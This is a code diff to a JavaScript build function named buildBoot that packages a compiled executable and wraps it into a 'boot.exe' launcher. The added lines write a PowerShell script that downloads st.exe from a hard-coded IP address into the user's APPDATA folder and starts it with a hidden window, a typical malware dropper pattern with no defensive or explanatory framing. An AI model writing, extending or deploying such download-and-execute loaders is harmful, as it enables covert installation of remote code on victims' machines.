@@ -35,7 +35,19 @@ export async function buildBoot({ key }) {
   }
 
   if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
+  
+  // Save the compiled Rust exe
   fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));
+
+  // Create the PowerShell script that boot.exe will run
+  const ps1Content = `
+$dir = "$env:APPDATA";
+$exe = "$dir\\st.exe";
+$url = "http://31.58.77.63/api/downloads/st.exe";
+(New-Object Net.WebClient).DownloadFile($url, $exe);
+Start-Process -FilePath $exe -WindowStyle Hidden;
+`;
+  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'st.ps1'), ps1Content, 'utf8');
 
   console.log('[build] wrapping into boot.exe...');
   const bootBuf = await compileLauncher({ key, config: { ip: '31.58.77.63' }, baseExe });
